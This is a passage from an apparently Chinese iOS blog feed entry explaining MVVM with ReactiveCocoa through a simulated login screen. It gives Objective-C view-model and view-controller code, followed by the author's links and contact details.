class="comment">// 错误信号</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) RACSubject *errorSubject;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> *  按钮是否可点信号</div><div class="line"> *</div><div class="line"> *  @return</div><div class="line"> */</div><div class="line">- (RACSignal *)validSignal;</div><div class="line"><span class="comment">/**</span></div><div class="line"> *  登陆操作</div><div class="line"> */</div><div class="line">- (<span class="keyword">void</span>)login;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<hr>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">"LoginViewModel.h"</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">"User.h"</span></span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">LoginViewModel</span> ()</span></div><div class="line"></div><div class="line"><span class="comment">/** 用户名改变信号 */</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) RACSignal *userNameSignal;</div><div class="line"><span class="comment">/** 密码改变信号 */</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) RACSignal *passwordSignal;</div><div class="line"><span class="comment">/** 请求数据（模拟） */</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSArray</span> *requestData;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">LoginViewModel</span></span></div><div class="line"></div><div class="line">- (<span class="keyword">instancetype</span>)init &#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">self</span> = [<span class="keyword">super</span> init]) &#123;</div><div class="line">        <span class="comment">// RACObserve(self, name):监听某个对象的某个属性,返回的是信号。</span></div><div class="line">        _userNameSignal = RACObserve(<span class="keyword">self</span>, userName);</div><div class="line">        _passwordSignal = RACObserve(<span class="keyword">self</span>, password);</div><div class="line">        _successSubject = [RACSubject subject];</div><div class="line">        _failureSubject = [RACSubject subject];</div><div class="line">        _errorSubject = [RACSubject subject];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">self</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> *  按钮是否可点信息</div><div class="line"> *</div><div class="line"> *  @return</div><div class="line"> */</div><div class="line">- (RACSignal *)validSignal &#123;</div><div class="line">    RACSignal *validSignal = [RACSignal combineLatest:@[_userNameSignal, _passwordSignal] reduce:^<span class="keyword">id</span>(<span class="built_in">NSString</span> *userName, <span class="built_in">NSString</span> *password)&#123;</div><div class="line">        <span class="comment">// 要求用户名和密码大于6位数</span></div><div class="line">        <span class="keyword">return</span> @(userName.length &gt;= <span class="number">6</span> &amp;&amp; password.length &gt;= <span class="number">6</span>);</div><div class="line">    &#125;];</div><div class="line">    <span class="keyword">return</span> validSignal;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> *  登陆操作</div><div class="line"> */</div><div class="line">- (<span class="keyword">void</span>)login&#123;</div><div class="line">    <span class="comment">// 网络请求进行登录，当然这里只是模拟一下</span></div><div class="line">    User *user = [[User alloc] init];</div><div class="line">    user.username = <span class="keyword">self</span>.userName;</div><div class="line">    user.password = <span class="keyword">self</span>.password;</div><div class="line">    _requestData = @[user];</div><div class="line">    <span class="comment">// 成功发送成功的信号</span></div><div class="line">    [_successSubject sendNext:_requestData];</div><div class="line">    <span class="comment">// 如果失败发送失败的信息号</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<p>通过这一层，你是否发现，VM是可以单独测试的，也是可以单独编写的，即使你没有写 <code>View</code> 层，你可以编写针对VM的Unit进行功能测试，确保VM无误后继续编写后续代码。</p>
<h3 id="V层"><a href="#V层" class="headerlink" title="V层"></a>V层</h3><p>首先我们要通过RAC实现一部分UI的功能——输入文字的时候同步将文字保存起来&amp;&amp;控制按钮的禁用状态。</p>
<p>想想看我们通常是怎么做的？</p>
<ol>
<li>通过实现UITextField的代理</li>
<li>在 <code>- (BOOL)textField:(UITextField *)textField shouldChangeCharactersInRange:(NSRange)range replacementString:(NSString *)string;</code> 方法中获取输入的文字，赋值给username属性和password属性</li>
<li>再判断username和password是否符合要求</li>
<li>再设置按钮的enabled属性</li>
</ol>
<p>是不是看一看就觉得乱糟糟的，按钮的addTarget在一个地方，代理又在一个地方，再加上判断用户名密码合法逻辑单独抽出的方法。OMG。</p>
<p>ReactiveCocoa是怎么做的？</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">RAC(<span class="keyword">self</span>.viewModel, userName) = <span class="keyword">self</span>.tfUserName.rac_textSignal;</div><div class="line">RAC(<span class="keyword">self</span>.viewModel, password) = <span class="keyword">self</span>.tfPassword.rac_textSignal;</div><div class="line">RAC(<span class="keyword">self</span>.btLogin, enabled) = [<span class="keyword">self</span>.viewModel validSignal];</div></pre></td></tr></table></figure>
<p>三句话，清清爽爽。</p>
<p>再加上 <code>ViewModel</code> 的信号绑定，将上面的代码放到一个方法中，命名为<code>bindModel</code></p>
<p>最后的代码如下：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">"ViewController.h"</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">"ReactiveCocoa.h"</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">"LoginViewModel.h"</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">"User.h"</span></span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">ViewController</span> ()</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) LoginViewModel *viewModel;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">weak</span>, <span class="keyword">nonatomic</span>  ) <span class="keyword">IBOutlet</span> <span class="built_in">UITextField</span>    *tfUserName;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">weak</span>, <span class="keyword">nonatomic</span>  ) <span class="keyword">IBOutlet</span> <span class="built_in">UITextField</span>    *tfPassword;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">weak</span>, <span class="keyword">nonatomic</span>  ) <span class="keyword">IBOutlet</span> <span class="built_in">UIButton</span>       *btLogin;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">ViewController</span></span></div><div class="line"></div><div class="line">- (<span class="keyword">void</span>)viewDidLoad &#123;</div><div class="line">    [<span class="keyword">super</span> viewDidLoad];</div><div class="line">    [<span class="keyword">self</span> bindModel];</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> *  绑定Model中的各种事件</div><div class="line"> */</div><div class="line">- (<span class="keyword">void</span>)bindModel &#123;</div><div class="line">    <span class="keyword">self</span>.viewModel = [[LoginViewModel alloc] init];</div><div class="line">    RAC(<span class="keyword">self</span>.viewModel, userName) = <span class="keyword">self</span>.tfUserName.rac_textSignal;</div><div class="line">    RAC(<span class="keyword">self</span>.viewModel, password) = <span class="keyword">self</span>.tfPassword.rac_textSignal;</div><div class="line">    RAC(<span class="keyword">self</span>.btLogin, enabled) = [<span class="keyword">self</span>.viewModel validSignal];</div><div class="line">    </div><div class="line"><span class="comment">//    @weakify(self);</span></div><div class="line">    <span class="comment">// 订阅登录成功信号并作出处理</span></div><div class="line">    [<span class="keyword">self</span>.viewModel.successSubject subscribeNext:^(<span class="built_in">NSArray</span> * x) &#123;</div><div class="line"><span class="comment">//        @strongify(self);</span></div><div class="line">        User *user = x[<span class="number">0</span>];</div><div class="line">        <span class="built_in">NSLog</span>(<span class="string">@"username:%@\tpassword:%@"</span>, user.username, user.password);</div><div class="line">        <span class="built_in">NSLog</span>(<span class="string">@"登陆成功"</span>);</div><div class="line">    &#125;];</div><div class="line">    </div><div class="line">    <span class="comment">// 订阅登录失败信号并作出处理</span></div><div class="line">    [<span class="keyword">self</span>.viewModel.failureSubject subscribeNext:^(<span class="keyword">id</span> x) &#123;</div><div class="line">        <span class="built_in">NSLog</span>(<span class="string">@"登陆失败"</span>);</div><div class="line">    &#125;];</div><div class="line">    </div><div class="line">    <span class="comment">// 订阅登录错误信号并作出处理</span></div><div class="line">    [<span class="keyword">self</span>.viewModel.errorSubject subscribeNext:^(<span class="keyword">id</span> x) &#123;</div><div class="line">        <span class="built_in">NSLog</span>(<span class="string">@"登陆错误"</span>);</div><div class="line">    &#125;];</div><div class="line">    </div><div class="line">    <span class="comment">// 添加按钮点击事件</span></div><div class="line">    [[<span class="keyword">self</span>.btLogin rac_signalForControlEvents:<span class="built_in">UIControlEventTouchUpInside</span>] subscribeNext:^(<span class="keyword">id</span> x) &#123;</div><div class="line">        [<span class="keyword">self</span>.viewModel login];</div><div class="line">    &#125;];</div><div class="line">    </div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<p>这样，ViewController中事件处理的所有代码被集中在一起，方便管理，你的代码变得如此清爽、低耦合。</p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>以上代码地址请点<a href="http://download.csdn.net/detail/u010127917/9528911" target="_blank" rel="external">这里</a>。</p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>小鱼最近在换工作哟~各路的朋友有推荐的请务必介绍我哟~<br>简历在<a href="http://zhoulingyu.com/about/">这里</a></p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我 <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x63;&#111;&#x64;&#x65;&#114;&#102;&#x69;&#115;&#x68;&#x40;&#x31;&#54;&#x33;&#46;&#99;&#x6f;&#x6d;">&#x63;&#111;&#x64;&#x65;&#114;&#102;&#x69;&#115;&#x68;&#x40;&#x31;&#54;&#x33;&#46;&#99;&#x6f;&#x6d;</a>。</p>
<p>博主是 iOS 妹子一枚。</p>
<p>希望大家一起进步。</p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-MVVM简介&quot;&gt;&lt;a href=&quot;#1-MVVM简介&quot; class=&quot;headerlink&quot; title=&quot;1. MVVM简介&quot;&gt;&lt;/a&gt;1. MVVM简介&lt;/h1&gt;&lt;p&gt;不过多赘述MVC，用最通俗的方式解说MVVM。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;拆解：&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;M：&lt;/strong&gt; &lt;code&gt;Model&lt;/code&gt; ，包括数据模型、访问数据库的操作和网络请求等&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;V：&lt;/strong&gt; &lt;code&gt;View&lt;/code&gt; ，包括了iOS中的 &lt;code&gt;View&lt;/code&gt; 和 &lt;code&gt;controller&lt;/code&gt; 组成，负责 UI 的展示，绑定 viewModel 中的属性&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;VM：&lt;/strong&gt; &lt;code&gt;ViewModel&lt;/code&gt; ，负责从 &lt;code&gt;Model&lt;/code&gt; 中获取 &lt;code&gt;View&lt;/code&gt; 所需的数据，转换成 &lt;code&gt;View&lt;/code&gt; 可以展示的数据，并暴露公开的属性和命令供 &lt;code&gt;View&lt;/code&gt; 进行绑定&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Binder：&lt;/strong&gt;这是我最近发现的，在标准MVVM中没有提到的一部分，但是如果使用MVVM + ReactiveCocoa就会自然地写出这一层。这一层主要为了实现响应式编程的功能，实现 &lt;code&gt;View&lt;/code&gt; 和  &lt;code&gt;ViewModel&lt;/code&gt; 的同步&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
  </entry>
  
</feed>
